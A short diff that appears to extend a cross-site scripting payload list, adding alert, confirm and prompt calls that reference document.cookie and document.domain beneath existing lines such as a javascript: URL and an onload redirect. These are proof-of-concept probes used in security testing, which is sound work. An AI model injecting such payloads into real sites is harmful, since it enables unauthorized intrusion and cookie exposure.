@@ -127,3 +127,15 @@ javascript:alert(document.cookie)
 <body style="background-color:red">
 <body style="background-color:red !important;">
 <body onload=window.location.assign('https://www.google.com')>
+alert(123)
+alert("test")
+alert(document.cookie)
+alert(document.domain)
+confirm(123)
+confirm("test")
+confirm(document.cookie)
+confirm(document.domain)
+prompt(123)
+prompt("test")
+prompt(document.cookie)
+prompt(document.domain)
